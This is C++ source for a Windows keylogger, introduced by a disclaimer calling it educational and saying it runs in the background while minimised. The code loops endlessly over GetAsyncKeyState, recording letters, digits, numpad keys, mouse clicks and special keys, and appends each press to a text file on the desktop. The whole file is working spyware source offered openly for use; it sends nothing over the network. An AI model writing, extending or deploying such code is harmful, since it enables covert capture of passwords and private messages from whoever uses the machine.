/**
 * DISCLAIMER: THIS PROGRAM IS FOR DEMONSTRATION PURPOSES ONLY AND IS NOT INTENDED FOR MALICIOUS USE;
 * I AM NOT RESPONSIBLE FOR ANY TROUBLE/DAMAGE CAUSED, ANY SOCIAL ENGINEERING, AND ANY OTHER SORT OF
 * ILLEGAL ACTIVITY A RESULT OF USING THIS PROGRAM.
 * I take NO responsibility and/or liability for how you choose to use any of the source code available here.
 * By using the files available, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again, 
 * ALL files available here are for EDUCATION and/or RESEARCH purposes ONLY.
 *
 *
 *
 *
 * This program is to act as a keylogger; a majority of this code was not written by me, but I cannot 
 * find the original author as this program was saved by me at least more than a year ago. However, 
 * changes were made to it by adding 'else if' instead of just 'if' for faster logic flow, and special
 * keys that are not alpha-numeric were also added. The program works in the background so you can 
 * have it running while the window is not highlighted and while minimized. 
 */


#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

void save_in_file(const char* x)
{
    ofstream myfile; //ofstream to write into file
	//CHANGE THE DIRECTORY TO THE FILE YOU WANT TO WRITE TO
    myfile.open("c:/Users/John/Desktop/keys.txt", ios_base::app); //seek to the end of the file before write
    myfile << x ; //print keypress into file
    myfile << "\n";
    myfile.close(); 
}


int main()
{
    while(1)
    {
        if( GetAsyncKeyState( 'A' ) & 0x0001 )
        {
            save_in_file("A");
        }
        else if( GetAsyncKeyState( 'B' ) & 0x0001 )
        {
            save_in_file("B");
        }
        else if( GetAsyncKeyState( 'C' ) & 0x0001 )
        {
            save_in_file("C");
        }
        else if( GetAsyncKeyState( 'D' ) & 0x0001 )
        {
            save_in_file("D");
        }
        else if( GetAsyncKeyState( 'E' ) & 0x0001 )
        {
            save_in_file("E");
        }
        else if( GetAsyncKeyState( 'F' ) & 0x0001 )
        {
            save_in_file("F");
        }
        else if( GetAsyncKeyState( 'G' ) & 0x0001 )
        {
            save_in_file("G");
        }
        else if( GetAsyncKeyState( 'H' ) & 0x0001 )
        {
            save_in_file("H");
        }
        else if( GetAsyncKeyState( 'I' ) & 0x0001 )
        {
            save_in_file("I");
        }
        else if( GetAsyncKeyState( 'J' ) & 0x0001 )
        {
            save_in_file("J");
        }
        else if( GetAsyncKeyState( 'K' ) & 0x0001 )
        {
            save_in_file("K");
        }
        else if( GetAsyncKeyState( 'L' ) & 0x0001 )
        {
            save_in_file("L");
        }
        else if( GetAsyncKeyState( 'M' ) & 0x0001 )
        {
            save_in_file("M");
        }
        else if( GetAsyncKeyState( 'N' ) & 0x0001 )
        {
            save_in_file("N");
        }
        else if( GetAsyncKeyState( 'O' ) & 0x0001 )
        {
            save_in_file("O");
        }
        else if( GetAsyncKeyState( 'P' ) & 0x0001 )
        {
            save_in_file("P");
        }
        else if( GetAsyncKeyState( 'Q' ) & 0x0001 )
        {
            save_in_file("Q");
        }
        else if( GetAsyncKeyState( 'R' ) & 0x0001 )
        {
            save_in_file("R");
        }
        else if( GetAsyncKeyState( 'S' ) & 0x0001 )
        {
            save_in_file("S");
        }
        else if( GetAsyncKeyState( 'T' ) & 0x0001 )
        {
            save_in_file("T");
        }
        else if( GetAsyncKeyState( 'U' ) & 0x0001 )
        {
            save_in_file("U");
        }
        else if( GetAsyncKeyState( 'V' ) & 0x0001 )
        {
            save_in_file("V");
        }
        else if( GetAsyncKeyState( 'W' ) & 0x0001 )
        {
            save_in_file("W");
        }
        else if( GetAsyncKeyState( 'X' ) & 0x0001 )
        {
            save_in_file("X");
        }
        else if( GetAsyncKeyState( 'Y' ) & 0x0001 )
        {
            save_in_file("Y");
        }
        else if( GetAsyncKeyState( 'Z' ) & 0x0001 )
        {
            save_in_file("Z");
        }
        else if( GetAsyncKeyState( '0' ) & 0x0001 )
        {
            save_in_file("0");
        }
        else if( GetAsyncKeyState( '1' ) & 0x0001 )
        {
            save_in_file("1");
        }
        else if( GetAsyncKeyState( '2' ) & 0x0001 )
        {
            save_in_file("2");
        }
        else if( GetAsyncKeyState( '3' ) & 0x0001 )
        {
            save_in_file("3");
        }
        else if( GetAsyncKeyState( '4' ) & 0x0001 )
        {
            save_in_file("4");
        }
        else if( GetAsyncKeyState( '5' ) & 0x0001 )
        {
            save_in_file("5");
        }
        else if( GetAsyncKeyState( '6' ) & 0x0001 )
        {
            save_in_file("6");
        }
        else if( GetAsyncKeyState( '7' ) & 0x0001 )
        {
            save_in_file("7");
        }
        else if( GetAsyncKeyState( '8' ) & 0x0001 )
        {
            save_in_file("8");
        }
        else if( GetAsyncKeyState( '9' ) & 0x0001 )
        {
            save_in_file("9");
        }
        else if( GetAsyncKeyState( VK_NUMPAD0 ) & 0x0001 )
        {
            save_in_file("0");
        }
        else if( GetAsyncKeyState( VK_NUMPAD1 ) & 0x0001 )
        {
            save_in_file("1");
        }
        else if( GetAsyncKeyState( VK_NUMPAD2 ) & 0x0001 )
        {
            save_in_file("2");
        }
        else if( GetAsyncKeyState( VK_NUMPAD3 ) & 0x0001 )
        {
            save_in_file("3");
        }
        else if( GetAsyncKeyState( VK_NUMPAD4 ) & 0x0001 )
        {
            save_in_file("4");
        }
        else if( GetAsyncKeyState( VK_NUMPAD5 ) & 0x0001 )
        {
            save_in_file("5");
        }
        else if( GetAsyncKeyState( VK_NUMPAD6 ) & 0x0001 )
        {
            save_in_file("6");
        }
        else if( GetAsyncKeyState( VK_NUMPAD7 ) & 0x0001 )
        {
            save_in_file("7");
        }
        else if( GetAsyncKeyState( VK_NUMPAD8 ) & 0x0001 )
        {
            save_in_file("8");
        }
        else if( GetAsyncKeyState( VK_NUMPAD9 ) & 0x0001 )
        {
            save_in_file("9");
        }
        else if( GetAsyncKeyState( VK_LBUTTON ) & 0x0001 )
        {
            save_in_file("left mouse");
        }
        else if( GetAsyncKeyState( VK_RBUTTON ) & 0x0001 )
        {
            save_in_file("right mouse");
        }
        else if( GetAsyncKeyState( VK_CAPITAL ) & 0x0001 )
        {
            save_in_file("caps lock");
        }
        else if( GetAsyncKeyState( VK_ESCAPE ) & 0x0001 )
        {
            save_in_file("esc");
        }
        else if( GetAsyncKeyState( VK_SPACE ) & 0x0001 )
        {
            save_in_file("space bar");
        }
        else if( GetAsyncKeyState( VK_LEFT ) & 0x0001 )
        {
            save_in_file("left arrow");
        }
        else if( GetAsyncKeyState( VK_RIGHT ) & 0x0001 )
        {
            save_in_file("right arrow");
        }
        else if( GetAsyncKeyState( VK_UP ) & 0x0001 )
        {
            save_in_file("UP arrow");
        }
        else if( GetAsyncKeyState( VK_DOWN ) & 0x0001 )
        {
            save_in_file("DOWN arrow");
        }
        else if( GetAsyncKeyState( VK_DELETE ) & 0x0001 )
        {
            save_in_file("del");
        }
        else if( GetAsyncKeyState( VK_ADD ) & 0x0001 )
        {
            save_in_file("+");
        }
        else if( GetAsyncKeyState( VK_MULTIPLY ) & 0x0001 )
        {
            save_in_file("*");
        }
        else if( GetAsyncKeyState( VK_DIVIDE ) & 0x0001 )
        {
            save_in_file("/");
        }
        else if( GetAsyncKeyState( VK_SUBTRACT ) & 0x0001 )
        {
            save_in_file("-");
        }
        else if( GetAsyncKeyState( VK_DELETE ) & 0x0001 )
        {
            save_in_file("del");
        }
        else if( GetAsyncKeyState( VK_DECIMAL ) & 0x0001 )
        {
            save_in_file(", or .");
        }
        else if( GetAsyncKeyState( VK_LSHIFT ) & 0x0001 )
        {
            save_in_file("left SHIFT");
        }
        else if( GetAsyncKeyState( VK_RSHIFT ) & 0x0001 )
        {
            save_in_file("right SHIFT");
        }
        else if( GetAsyncKeyState( VK_BACK ) & 0x0001 )
        {
            save_in_file("backspace");
        }
        else if( GetAsyncKeyState( VK_TAB ) & 0x0001 )
        {
            save_in_file("tab");
        }
        else if( GetAsyncKeyState( VK_CONTROL) & 0x0001 )
        {
            save_in_file("ctrl / strg");
        }
    }
}
